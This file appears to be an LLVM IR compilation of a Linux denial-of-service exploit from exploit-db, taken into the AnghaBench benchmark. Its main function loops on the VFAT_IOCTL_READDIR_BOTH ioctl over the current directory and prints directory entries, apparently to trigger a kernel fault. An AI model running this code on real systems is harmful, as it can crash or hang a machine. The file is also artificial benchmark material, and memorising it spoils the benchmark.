; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_30080.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_30080.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.kernel_dirent = type { i64, i32, i32, i8* }

@.str = private unnamed_addr constant [2 x i8] c".\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@VFAT_IOCTL_READDIR_BOTH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c"SFN: reclen=%2d off=%d ino=%d, %-12s\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"\09LFN: reclen=%2d off=%d ino=%d, %s\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [2 x %struct.kernel_dirent], align 16
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @O_RDONLY, align 4
  %6 = call i32 @open(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i32 %5)
  store i32 %6, i32* %2, align 4
  br label %7

7:                                                ; preds = %0, %54
  %8 = load i32, i32* %2, align 4
  %9 = load i32, i32* @VFAT_IOCTL_READDIR_BOTH, align 4
  %10 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 0
  %11 = ptrtoint %struct.kernel_dirent* %10 to i64
  %12 = call i32 @ioctl(i32 %8, i32 %9, i64 %11)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %7
  br label %56

16:                                               ; preds = %7
  %17 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 0
  %18 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %17, i32 0, i32 0
  %19 = load i64, i64* %18, align 16
  %20 = icmp eq i64 %19, 0
  br i1 %20, label %21, label %22

21:                                               ; preds = %16
  br label %56

22:                                               ; preds = %16
  %23 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 0
  %24 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %23, i32 0, i32 0
  %25 = load i64, i64* %24, align 16
  %26 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 0
  %27 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %26, i32 0, i32 1
  %28 = load i32, i32* %27, align 8
  %29 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 0
  %30 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 4
  %32 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 0
  %33 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %32, i32 0, i32 3
  %34 = load i8*, i8** %33, align 16
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i64 %25, i32 %28, i32 %31, i8* %34)
  %36 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 1
  %37 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %36, i32 0, i32 0
  %38 = load i64, i64* %37, align 8
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %54

40:                                               ; preds = %22
  %41 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 1
  %42 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %41, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 1
  %45 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %44, i32 0, i32 1
  %46 = load i32, i32* %45, align 8
  %47 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 1
  %48 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %47, i32 0, i32 2
  %49 = load i32, i32* %48, align 4
  %50 = getelementptr inbounds [2 x %struct.kernel_dirent], [2 x %struct.kernel_dirent]* %3, i64 0, i64 1
  %51 = getelementptr inbounds %struct.kernel_dirent, %struct.kernel_dirent* %50, i32 0, i32 3
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i64 %43, i32 %46, i32 %49, i8* %52)
  br label %54

54:                                               ; preds = %40, %22
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  br label %7

56:                                               ; preds = %21, %15
  ret i32 0
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @ioctl(i32, i32, i64) #1

declare dso_local i32 @printf(i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
